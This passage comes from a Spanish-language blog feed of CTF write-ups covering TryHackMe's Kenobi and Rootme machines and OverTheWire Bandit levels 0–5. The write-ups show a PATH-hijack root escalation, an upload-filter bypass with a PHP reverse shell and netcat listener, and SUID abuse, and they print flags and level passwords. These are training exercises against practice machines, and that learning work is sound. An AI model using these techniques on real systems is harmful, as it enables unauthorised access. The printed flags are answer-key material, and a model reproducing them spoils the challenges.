+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kenobi@kenobi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
+kenobi@kenobi:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; /bin/sh &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; curl
+kenobi@kenobi:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;777 curl
+kenobi@kenobi:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Creamos un archivo curl&lt;/li&gt;
+  &lt;li&gt;le damos permisos&lt;/li&gt;
+  &lt;li&gt;exportamos el path&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kenobi@kenobi:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/menu
+
+&lt;span class=&quot;k&quot;&gt;***************************************&lt;/span&gt;
+1. status check
+2. kernel version
+3. ifconfig
+&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; Enter your choice :1
+ &lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
+root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;ahora que somos &lt;em&gt;root&lt;/em&gt; solo nos queda encontrar la &lt;em&gt;flag&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cd root&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
+root.txt
+&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
+root.txt
+&lt;span class=&quot;c&quot;&gt;# cat root.txt&lt;/span&gt;
+177b3cd8562289f37382721c28381f02
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="FTP" /><category term="SSH" /><category term="SUID" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">tryhackme: Rootme</title><link href="http://localhost:4000/Rootme/" rel="alternate" type="text/html" title="tryhackme: Rootme" /><published>2021-10-21T00:00:00-05:00</published><updated>2021-10-21T00:00:00-05:00</updated><id>http://localhost:4000/Rootme</id><content type="html" xml:base="http://localhost:4000/Rootme/">&lt;h1 id=&quot;1-escaneo-de-puertos&quot;&gt;1. Escaneo de puertos&lt;/h1&gt;
+
+&lt;p&gt;Lo primero que haremos ser un &lt;em&gt;ping -c 1&lt;/em&gt; al &lt;em&gt;ip&lt;/em&gt; y ver si nuestra maquina ya esta activa&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/rootme/ping.png&quot; alt=&quot;descripcion imagene&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;usamos &lt;em&gt;wichSystem.py&lt;/em&gt; (utilidad desarrollada por @s4vitar) para ver con que clase de maquina estamos trabajando&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/rootme/linux.png&quot; alt=&quot;descripcion imagene&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Ahora realizamos un primer escaneo de puertos usando la &lt;em&gt;nmap&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/rootme/nmap1.png&quot; alt=&quot;descripcion imagene&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Descripción de los parámetros:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;-p- : Escanea los puertos especificados, en este caso escanea los 65535 puertos.&lt;/li&gt;
+  &lt;li&gt;-sS : Escanea TCP SYN&lt;/li&gt;
+  &lt;li&gt;–min-rate: Envía paquetes no mas lentos que el número indicado por segundo en nuestro caso 5000.&lt;/li&gt;
+  &lt;li&gt;–open: Muestra solo los puertos abiertos.&lt;/li&gt;
+  &lt;li&gt;-vvv : Muestra la información mientras se esta realizando el escaneo.&lt;/li&gt;
+  &lt;li&gt;-Pn : Omite el descubrimiento de host.&lt;/li&gt;
+  &lt;li&gt;-n : No realiza resolución DNS.&lt;/li&gt;
+  &lt;li&gt;ip: la ip que queremos escanear&lt;/li&gt;
+  &lt;li&gt;-oG : Guarda la salida del escaneo en un formato grepeable (no sea util mas adelante)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/rootme/linux1.png&quot; alt=&quot;descripcion imagene&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;vemos el resultado del escaneo usando un scripts llamado &lt;em&gt;extractPorts&lt;/em&gt; ya configurado en mi &lt;em&gt;~./zshrc&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/rootme/ports.png&quot; alt=&quot;descripcion imagene&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya que sabemos que la maquina tiene abierto los puerto s &lt;em&gt;80,22&lt;/em&gt;  intentaremos averiguar que servicios corren y en que versiones&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/rootme/nmap2.png&quot; alt=&quot;descripcion imagene&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;2-recoleccion-de-información&quot;&gt;2. Recoleccion de información&lt;/h1&gt;
+
+&lt;p&gt;Iniciamos buscando rutas usando la herramienta &lt;em&gt;gobuster&lt;/em&gt;, su metodo de uso es simple:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;dir : Utiliza el modo de enumeración de directorios/archivos.&lt;/li&gt;
+  &lt;li&gt;-u : Le indicamos que le vamos a pasar una url.&lt;/li&gt;
+  &lt;li&gt;ruta: la url objetivo&lt;/li&gt;
+  &lt;li&gt;-w : Le indicamos que vamos a usar un diccionario.&lt;/li&gt;
+  &lt;li&gt;/PATH/ : Le indicamos la ruta del diccionario a usar.&lt;/li&gt;
+  &lt;li&gt;–no-error : No muestra errores por pantalla.&lt;/li&gt;
+  &lt;li&gt;-o : Guarda la salida en un archivo.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/rootme/gobuster.png&quot; alt=&quot;descripcion imagene&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que tenemos varias rutas, iniciemos probando con &lt;em&gt;https://10.10.244.164/panel&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/rootme/panel.png&quot; alt=&quot;descripcion imagene&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Editamos la siguiente shell con nuestra ip y puerto a trabajar&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/rootme/shell.png&quot; alt=&quot;descripcion imagene&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://https://github.com/pentestmonkey/php-reverse-shell&quot;&gt;shell-php&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;al ver que no nos permite cargar archivos &lt;em&gt;php&lt;/em&gt;, intentamos cargar &lt;em&gt;php5&lt;/em&gt; y vermos que si nos puermite subirlo&lt;/p&gt;
+
+&lt;h1 id=&quot;3-ganando-acceso-a-la-maquina&quot;&gt;3. Ganando acceso a la maquina&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/rootme/shell2.png&quot; alt=&quot;descripcion imagene&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;vamos una de las rutas que encontramos con &lt;em&gt;gobuster&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/rootme/shell3.png&quot; alt=&quot;descripcion imagene&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;ponemos nuestra maquina en escucha para recivir la conexion desde la maquina que estamos trabajando&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Descripción de los parametros utilizados:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;-n : Solo direcciones de IP numéricas.&lt;/li&gt;
+  &lt;li&gt;-l : Modo de escucha, para conexiones entrantes.&lt;/li&gt;
+  &lt;li&gt;-v : Muestra información por pantalla.&lt;/li&gt;
+  &lt;li&gt;-p : Numero del puerto.&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;1234 : El puerto que se pondrá en escucha.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Vemos que usuario somos usando &lt;em&gt;whoami&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/rootme/user.png&quot; alt=&quot;descripcion imagene&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Estamos dentro del sistema siendo el usuario www-data, vamos buscar la flag&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/rootme/flag.png&quot; alt=&quot;flag&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;4-escalamos-privilegios&quot;&gt;4. Escalamos privilegios&lt;/h1&gt;
+
+&lt;p&gt;Continuando con la maquina, nos pregunta &lt;em&gt;Search for files with SUID permission, which file is weird?&lt;/em&gt;
+vamos a usar el comando&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;el cual nos permiste buscar archivos con permisos &lt;em&gt;SUID&lt;/em&gt;, lo cual son permisos especial&lt;/li&gt;
+  &lt;li&gt;el 2&amp;gt;/dev/null nos envia los errores (no tiene permisos &lt;em&gt;SUID&lt;/em&gt; a dicha ruta&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/rootme/suid.png&quot; alt=&quot;permisos suid&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Entre los &lt;em&gt;files&lt;/em&gt; que podemos ver llama la atencion que &lt;em&gt;python&lt;/em&gt; tenga dichos permisos asi que buscamos en - &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/rootme/root.png&quot; alt=&quot;root&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;comprovamos que usuario somos y pasamos a buscar la flag.&lt;/p&gt;
+
+&lt;h2 id=&quot;fin-de-la-maquina-rootme&quot;&gt;fin de la maquina Rootme&lt;/h2&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="web" /><category term="SUID" /><category term="RFI" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">Bandit0: Bash para principiantes</title><link href="http://localhost:4000/first-bandit/" rel="alternate" type="text/html" title="Bandit0: Bash para principiantes" /><published>2021-10-19T00:00:00-05:00</published><updated>2021-10-19T00:00:00-05:00</updated><id>http://localhost:4000/first-bandit</id><content type="html" xml:base="http://localhost:4000/first-bandit/">&lt;p&gt;En este post obtendremos las flags de la maquina bandit que se encuentra en la pagina &lt;a href=&quot;https://overthewire.org/wargames/bandit/&quot;&gt;bandit0&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Esta maquina basicamente consiste en que para subir de nivel debemos obtener la flag de la maquina, esta flag sera la contraseña para la siguiente maquina&lt;/p&gt;
+
+&lt;p&gt;Antes de iniciar debemos crear nuestro entorno de trabajo&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;bandit0
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;bandit0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;banquid-0--1&quot;&gt;Banquid 0 –&amp;gt; 1&lt;/h1&gt;
+&lt;p&gt;Esta primera maquina consiste en que debemos conectarnos a ella mediante SSH &lt;strong&gt;bandit.labs.overthewire.org&lt;/strong&gt; usando el puerto 2220, como usuario y contraseña
+usaremos &lt;strong&gt;bandit0&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;A continuacion nos conectamos a la maquina&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;n&quot;&gt;ssh&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bandit0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bandit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;labs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;overthewire&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2220&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;lo primero que hacemos es un &lt;strong&gt;ls&lt;/strong&gt; para ver los archivos que hay en la maquina…
+En este caso solo hay un archivo llamado &lt;strong&gt;readme&lt;/strong&gt; 
+le hacemos un &lt;em&gt;cat readme&lt;/em&gt; y vemos la flag
+Debemos copiarla en un archivo txt (o de vuestra preferencia) puesto que esta sera la key para la siguiente maquina&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/bandit0/0.png&quot; alt=&quot;obtenemos la flag&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandit-1--2&quot;&gt;bandit 1 –&amp;gt; 2&lt;/h1&gt;
+
+&lt;p&gt;Usamos la &lt;em&gt;flag&lt;/em&gt; que obtuvimos en la maquina pasada y la usamos como contraseña en esta maquina.&lt;/p&gt;
+
+&lt;p&gt;Ahora ya estamos en el nivel 1 de bandit, la descripcion de la maquina nos dice&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored in a file called - located in the home directory&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Por tanto, sabemos que la proxima contraseña se encuentra dentro de un directorio de nombre &lt;strong&gt;-&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Para poder leer archivo hay diferentes metodos, en este caso usaremos &lt;em&gt;cat ./*&lt;/em&gt; , lo que nos permite el comando &lt;strong&gt;cat&lt;/strong&gt; es leer todo dentro del directorio &lt;em&gt;./*&lt;/em&gt;
+lo podemos hacer puesto que sabemos que el directorio solo contiene un archivo a leer&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/bandit0/1.png&quot; alt=&quot;Obtenemos la flag&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandit-2--3&quot;&gt;bandit 2 –&amp;gt; 3&lt;/h1&gt;
+
+&lt;p&gt;Usamos la &lt;em&gt;flag&lt;/em&gt; que obtuvimos en la maquina pasada y la usamos como contraseña en esta maquina.&lt;/p&gt;
+
+&lt;p&gt;leemos lo que nos dice la descripcion de la maquina&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored in a file called spaces in this filename located in the home directory&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Aca iniciamos con pequeños inconvenientes puesto que no podemos leer directamente con el comando &lt;em&gt;cat&lt;/em&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;vemos-el-archivo&quot;&gt;vemos el archivo&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit2@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;spaces &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this filename
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Estos metodos lo que nos permite es “escapar” de los espacios
+&lt;img src=&quot;/assets/images/bandit0/2.png&quot; alt=&quot;Obtenemos la flag&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;vemos-2-formas-de-cumplir-nuestro-objetivo-obtener-la-flag-sin-embargo-hay-metodos-mas-practicos-de-hacerlos-por-ejemplo&quot;&gt;Vemos 2 formas de cumplir nuestro objetivo (obtener la flag), sin embargo, hay metodos mas practicos de hacerlos por ejemplo:&lt;/h3&gt;
+
+&lt;p&gt;Es un poco mas practico puesto (para este caso) puesto que “escapamos” de los espacios y visualizamos la flag con menos comando&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;El primero, con &lt;em&gt;cat&lt;/em&gt; nos muestra la informacion de los ficheros dentro de la ruta en donde estamos (para este caso solo tenemos un documento)&lt;/li&gt;
+  &lt;li&gt;El segundo, nos muestra la información que contengan los ficheros que inicien con &lt;em&gt;s&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/bandit0/2_1.png&quot; alt=&quot;Flag&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandit-3--4&quot;&gt;bandit 3 –&amp;gt; 4&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored in a hidden file in the inhere directory.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit3@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;inhere
+bandit3@bandit:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;inhere
+bandit3@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
+/home/bandit3/inhere
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Vemos que solo existe el directorio &lt;em&gt;inhere&lt;/em&gt;, entramos en el&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit3@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 12
+drwxr-xr-x 2 root    root    4096 May  7  2020 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 3 root    root    4096 May  7  2020 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-r-----&lt;/span&gt; 1 bandit4 bandit3   33 May  7  2020 .hidden
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Usamos los comando &lt;em&gt;ls -la&lt;/em&gt; para los listar directorios ocultos (en linux inician con &lt;em&gt;.&lt;/em&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit3@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .hidden
+pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Para poder leer el contenido del fichero debemos usar &lt;em&gt;cat&lt;/em&gt; incluyendo el punto que tiene en el nombre el archivo&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandi-4--5&quot;&gt;bandi 4 –&amp;gt; 5&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the “reset” command.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;solucion-1&quot;&gt;solucion 1&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Despues de entrar en el directorio inhere listamos el contenido&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit4@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find ./&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+./-file00
+./-file01
+./-file02
+./-file03
+./-file04
+./-file05
+./-file06
+./-file07
+./-file08
+./-file09
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;al comando anterior le agregamos *&lt;/td&gt;
+          &lt;td&gt;xargs file* lo cual nos especifica el tipo de archico que tenemos&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit4@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find ./&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; | xargs file
+./-file00: data
+./-file01: data
+./-file02: data
+./-file03: data
+./-file04: data
+./-file05: data
+./-file06: data
+./-file07: ASCII text
+./-file08: data
+./-file09: data
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Le añadimos el &lt;em&gt;grep TEXT -i&lt;/em&gt;, la funcion de este comando es filtrar los archivos solo en &lt;em&gt;texto legible por humanos&lt;/em&gt; la bandera &lt;em&gt;-i&lt;/em&gt; es para que no distinga entre m&amp;gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit4@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find ./&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; | xargs file | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;TEXT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
+./-file07: ASCII text
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;Finalmente le hacemos el ultimo filtro con &lt;em&gt;awk&lt;/em&gt; y la bandera &lt;em&gt;-F&lt;/em&gt; la cual solo nos tomara el primer parametro &lt;em&gt;./-file07&lt;/em&gt; y con el *&lt;/td&gt;
+          &lt;td&gt;xargs cat* leemos la flag&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit4@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find ./&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; | xargs file | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;TEXT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;'{print $1}'&lt;/span&gt; | xargs &lt;span class=&quot;nb&quot;&gt;cat
+&lt;/span&gt;koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;solucion-2-mas-corta&quot;&gt;Solucion 2 (mas corta)&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Para este caso nos funciona puesto que es el unico archivo de texto &lt;em&gt;./-file07: ASCII text&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit4@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find ./&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; | xargs file
+./-file00: data
+./-file01: data
+./-file02: data
+./-file03: data
+./-file04: data
+./-file05: data
+./-file06: data
+./-file07: ASCII text
+./-file08: data
+./-file09: data
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;simplemente le hacemos un &lt;em&gt;cat FileName&lt;/em&gt; y obtenemos la flag&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit4@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ./-file07
+koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;bandit-5--6&quot;&gt;bandit 5 –&amp;gt; 6&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:&lt;/p&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;human-readable&lt;/li&gt;
+    &lt;li&gt;1033 bytes in size&lt;/li&gt;
+    &lt;li&gt;not executable&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Inicialmente hacemos un &lt;em&gt;ls&lt;/em&gt; para ver a que nos enfrentamos y vemos que existen multiples carpetas.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bandit5@bandit:~/inhere&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;maybehere00  maybehere02  maybehere04  maybehere06  maybehere08  maybehere10  maybehere12  maybehere14  maybehere16  maybehere18
+maybehere01  maybehere03  maybehere05  maybehere07  maybehere09  maybehere11  maybehere13  maybehere15  maybehere17  maybehere19
